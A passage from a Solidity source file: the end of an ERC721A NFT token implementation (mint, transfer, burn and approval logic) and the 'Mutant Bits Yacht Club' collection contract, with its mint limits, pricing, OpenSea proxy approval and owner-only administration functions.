1078      * - `to` cannot be the zero address.
1079      * - `quantity` must be greater than 0.
1080      *
1081      * Emits a {Transfer} event.
1082      */
1083     function _mint(
1084         address to,
1085         uint256 quantity,
1086         bytes memory _data,
1087         bool safe
1088     ) internal {
1089         uint256 startTokenId = _currentIndex;
1090         if (to == address(0)) revert MintToZeroAddress();
1091         if (quantity == 0) revert MintZeroQuantity();
1092 
1093         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1094 
1095         // Overflows are incredibly unrealistic.
1096         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1097         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1098         unchecked {
1099             _addressData[to].balance += uint64(quantity);
1100             _addressData[to].numberMinted += uint64(quantity);
1101 
1102             _ownerships[startTokenId].addr = to;
1103             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1104 
1105             uint256 updatedIndex = startTokenId;
1106             uint256 end = updatedIndex + quantity;
1107 
1108             if (safe && to.isContract()) {
1109                 do {
1110                     emit Transfer(address(0), to, updatedIndex);
1111                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1112                         revert TransferToNonERC721ReceiverImplementer();
1113                     }
1114                 } while (updatedIndex != end);
1115                 // Reentrancy protection
1116                 if (_currentIndex != startTokenId) revert();
1117             } else {
1118                 do {
1119                     emit Transfer(address(0), to, updatedIndex++);
1120                 } while (updatedIndex != end);
1121             }
1122             _currentIndex = updatedIndex;
1123         }
1124         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1125     }
1126 
1127     /**
1128      * @dev Transfers `tokenId` from `from` to `to`.
1129      *
1130      * Requirements:
1131      *
1132      * - `to` cannot be the zero address.
1133      * - `tokenId` token must be owned by `from`.
1134      *
1135      * Emits a {Transfer} event.
1136      */
1137     function _transfer(
1138         address from,
1139         address to,
1140         uint256 tokenId
1141     ) private {
1142         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1143 
1144         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1145             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1146             getApproved(tokenId) == _msgSender());
1147 
1148         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1149         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1150         if (to == address(0)) revert TransferToZeroAddress();
1151 
1152         _beforeTokenTransfers(from, to, tokenId, 1);
1153 
1154         // Clear approvals from the previous owner
1155         _approve(address(0), tokenId, prevOwnership.addr);
1156 
1157         // Underflow of the sender's balance is impossible because we check for
1158         // ownership above and the recipient's balance can't realistically overflow.
1159         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1160         unchecked {
1161             _addressData[from].balance -= 1;
1162             _addressData[to].balance += 1;
1163 
1164             _ownerships[tokenId].addr = to;
1165             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1166 
1167             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1168             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1169             uint256 nextTokenId = tokenId + 1;
1170             if (_ownerships[nextTokenId].addr == address(0)) {
1171                 // This will suffice for checking _exists(nextTokenId),
1172                 // as a burned slot cannot contain the zero address.
1173                 if (nextTokenId < _currentIndex) {
1174                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1175                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1176                 }
1177             }
1178         }
1179 
1180         emit Transfer(from, to, tokenId);
1181         _afterTokenTransfers(from, to, tokenId, 1);
1182     }
1183 
1184     /**
1185      * @dev Destroys `tokenId`.
1186      * The approval is cleared when the token is burned.
1187      *
1188      * Requirements:
1189      *
1190      * - `tokenId` must exist.
1191      *
1192      * Emits a {Transfer} event.
1193      */
1194     function _burn(uint256 tokenId) internal virtual {
1195         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1196 
1197         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1198 
1199         // Clear approvals from the previous owner
1200         _approve(address(0), tokenId, prevOwnership.addr);
1201 
1202         // Underflow of the sender's balance is impossible because we check for
1203         // ownership above and the recipient's balance can't realistically overflow.
1204         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1205         unchecked {
1206             _addressData[prevOwnership.addr].balance -= 1;
1207             _addressData[prevOwnership.addr].numberBurned += 1;
1208 
1209             // Keep track of who burned the token, and the timestamp of burning.
1210             _ownerships[tokenId].addr = prevOwnership.addr;
1211             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1212             _ownerships[tokenId].burned = true;
1213 
1214             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1215             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1216             uint256 nextTokenId = tokenId + 1;
1217             if (_ownerships[nextTokenId].addr == address(0)) {
1218                 // This will suffice for checking _exists(nextTokenId),
1219                 // as a burned slot cannot contain the zero address.
1220                 if (nextTokenId < _currentIndex) {
1221                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1222                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1223                 }
1224             }
1225         }
1226 
1227         emit Transfer(prevOwnership.addr, address(0), tokenId);
1228         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1229 
1230         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1231         unchecked {
1232             _burnCounter++;
1233         }
1234     }
1235 
1236     /**
1237      * @dev Approve `to` to operate on `tokenId`
1238      *
1239      * Emits a {Approval} event.
1240      */
1241     function _approve(
1242         address to,
1243         uint256 tokenId,
1244         address owner
1245     ) private {
1246         _tokenApprovals[tokenId] = to;
1247         emit Approval(owner, to, tokenId);
1248     }
1249 
1250     /**
1251      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1252      *
1253      * @param from address representing the previous owner of the given token ID
1254      * @param to target address that will receive the tokens
1255      * @param tokenId uint256 ID of the token to be transferred
1256      * @param _data bytes optional data to send along with the call
1257      * @return bool whether the call correctly returned the expected magic value
1258      */
1259     function _checkContractOnERC721Received(
1260         address from,
1261         address to,
1262         uint256 tokenId,
1263         bytes memory _data
1264     ) private returns (bool) {
1265         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1266             return retval == IERC721Receiver(to).onERC721Received.selector;
1267         } catch (bytes memory reason) {
1268             if (reason.length == 0) {
1269                 revert TransferToNonERC721ReceiverImplementer();
1270             } else {
1271                 assembly {
1272                     revert(add(32, reason), mload(reason))
1273                 }
1274             }
1275         }
1276     }
1277 
1278     /**
1279      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1280      * And also called before burning one token.
1281      *
1282      * startTokenId - the first token id to be transferred
1283      * quantity - the amount to be transferred
1284      *
1285      * Calling conditions:
1286      *
1287      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1288      * transferred to `to`.
1289      * - When `from` is zero, `tokenId` will be minted for `to`.
1290      * - When `to` is zero, `tokenId` will be burned by `from`.
1291      * - `from` and `to` are never both zero.
1292      */
1293     function _beforeTokenTransfers(
1294         address from,
1295         address to,
1296         uint256 startTokenId,
1297         uint256 quantity
1298     ) internal virtual {}
1299 
1300     /**
1301      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1302      * minting.
1303      * And also called after one token has been burned.
1304      *
1305      * startTokenId - the first token id to be transferred
1306      * quantity - the amount to be transferred
1307      *
1308      * Calling conditions:
1309      *
1310      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1311      * transferred to `to`.
1312      * - When `from` is zero, `tokenId` has been minted for `to`.
1313      * - When `to` is zero, `tokenId` has been burned by `from`.
1314      * - `from` and `to` are never both zero.
1315      */
1316     function _afterTokenTransfers(
1317         address from,
1318         address to,
1319         uint256 startTokenId,
1320         uint256 quantity
1321     ) internal virtual {}
1322 }
1323 
1324 
1325 
1326 contract MutantBitsYachtClub is ERC721A, Owneable {
1327 
1328     string public baseURI = "ipfs://Qmb1VW95gvqyW3Km3m1KzdJPAdp4Uagedq3ixt97S1Rjuf/";
1329     string public contractURI = "ipfs://Qmb3G5mGJ9AsQN7dqoCqidLSuPUzKasq2RFDVYE4G2skQR";
1330     string public constant baseExtension = ".json";
1331     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1332 
1333     uint256 public constant MAX_PER_TX_FREE = 4;
1334     uint256 public FREE_MAX_SUPPLY = 3000;
1335     uint256 public constant MAX_PER_TX = 10;
1336     uint256 public MAX_SUPPLY = 10000;
1337     uint256 public price = 0.003 ether;
1338 
1339     bool public paused = true;
1340 
1341     constructor() ERC721A("Mutant Bits Yacht Club", "MBYC") {}
1342 
1343     function mint(uint256 _amount) external payable {
1344         address _caller = _msgSender();
1345         require(!paused, "Paused");
1346         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1347         require(_amount > 0, "No 0 mints");
1348         require(tx.origin == _caller, "No contracts");
1349         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1350         
1351       if(FREE_MAX_SUPPLY >= totalSupply()){
1352             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1353         }else{
1354             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1355             require(_amount * price == msg.value, "Invalid funds provided");
1356         }
1357 
1358 
1359         _safeMint(_caller, _amount);
1360     }
1361 
1362   
1363 
1364     function isApprovedForAll(address owner, address operator)
1365         override
1366         public
1367         view
1368         returns (bool)
1369     {
1370         // Whitelist OpenSea proxy contract for easy trading.
1371         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1372         if (address(proxyRegistry.proxies(owner)) == operator) {
1373             return true;
1374         }
1375 
1376         return super.isApprovedForAll(owner, operator);
1377     }
1378 
1379     function withdraw() external onlyOwner {
1380         uint256 balance = address(this).balance;
1381         (bool success, ) = _msgSender().call{value: balance}("");
1382         require(success, "Failed to send");
1383     }
1384 
1385     function collect() external onlyOwner {
1386         _safeMint(_msgSender(), 5);
1387     }
1388 
1389     function pause(bool _state) external onlyOwner {
1390         paused = _state;
1391     }
1392 
1393     function setBaseURI(string memory baseURI_) external onlyOwner {
1394         baseURI = baseURI_;
1395     }
1396 
1397     function setContractURI(string memory _contractURI) external onlyOwner {
1398         contractURI = _contractURI;
1399     }
1400 
1401     function configPrice(uint256 newPrice) public onlyOwner {
1402         price = newPrice;
1403     }
1404 
1405     function configMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1406         MAX_SUPPLY = newSupply;
1407     }
1408 
1409     function configFREE_MAX_SUPPLY(uint256 newFreesupply) public onlyOwner {
1410         FREE_MAX_SUPPLY = newFreesupply;
1411     }
1412 
1413     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1414         require(_exists(_tokenId), "Token does not exist.");
1415         return bytes(baseURI).length > 0 ? string(
1416             abi.encodePacked(
1417               baseURI,
1418               Strings.toString(_tokenId),
1419               baseExtension
1420             )
1421         ) : "";
1422     }
1423 }
1424 
1425 contract OwnableDelegateProxy { }
1426 contract ProxyRegistry {
1427     mapping(address => OwnableDelegateProxy) public proxies;
1428 }